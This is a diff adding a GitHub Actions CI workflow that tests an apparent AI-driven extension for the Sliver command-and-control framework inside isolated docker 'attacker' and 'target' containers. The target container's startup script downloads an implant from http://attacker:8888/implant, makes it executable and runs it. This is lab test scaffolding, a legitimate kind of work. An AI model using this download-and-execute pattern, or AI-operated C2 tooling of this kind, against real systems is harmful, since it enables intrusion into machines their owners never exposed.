@@ -1,0 +1,86 @@
+name: Pi-Sliver CI
+
+on:
+  push:
+    branches: [main]
+    paths:
+      - 'pi-sliver/**'
+      - 'ci/**'
+      - '.github/workflows/pi-sliver-ci.yml'
+  pull_request:
+    branches: [main]
+    paths:
+      - 'pi-sliver/**'
+      - 'ci/**'
+  workflow_dispatch:
+
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    timeout-minutes: 20
+
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      # ---------------------------------------------------------------
+      # Network: create a dedicated docker network so containers can
+      # resolve each other by name (attacker ↔ target).
+      # ---------------------------------------------------------------
+      - name: Create docker network
+        run: docker network create sliver-net
+
+      # ---------------------------------------------------------------
+      # Target container: minimal Linux box the implant will run on.
+      # We pre-install curl so the implant download works, and run a
+      # tiny HTTP health-check on :8080 so CI can verify the box is up.
+      # ---------------------------------------------------------------
+      - name: Start target container
+        run: |
+          docker run -d \
+            --name target \
+            --network sliver-net \
+            alpine:3.19 \
+            sh -c 'apk add --no-cache curl bash python3 &&
+              echo "ready" > /tmp/ready &&
+              echo "Polling for implant at http://attacker:8888/implant..." &&
+              for i in $(seq 1 120); do
+                if curl -sf http://attacker:8888/implant -o /tmp/implant 2>/dev/null; then
+                  chmod +x /tmp/implant &&
+                  echo "Implant downloaded, executing..." &&
+                  /tmp/implant &
+                  break
+                fi
+                sleep 2
+              done &&
+              sleep infinity'
+
+      # ---------------------------------------------------------------
+      # Attacker container: runs Pi + Sliver server + pi-sliver ext.
+      # We build it from the ci/attacker/Dockerfile.
+      # ---------------------------------------------------------------
+      - name: Build attacker image
+        run: docker build -t attacker -f ci/attacker/Dockerfile .
+
+      - name: Run attacker and execute test suite
+        run: |
+          # Wait for target to finish installing packages
+          echo "Waiting for target to be ready..."
+          for i in $(seq 1 30); do
+            if docker exec target sh -c 'command -v curl && command -v bash' 2>/dev/null; then
+              echo "Target is ready"
+              break
+            fi
+            sleep 2
+          done
+
+          docker run --rm \
+            --name attacker \
+            --network sliver-net \
+            -e LLM_API_KEY="${{ secrets.LLM_API_KEY }}" \
+            -e TARGET_IP="target" \
+            attacker
+
+      - name: Dump target logs on failure
+        if: failure()
+        run: docker logs target 2>&1 || true
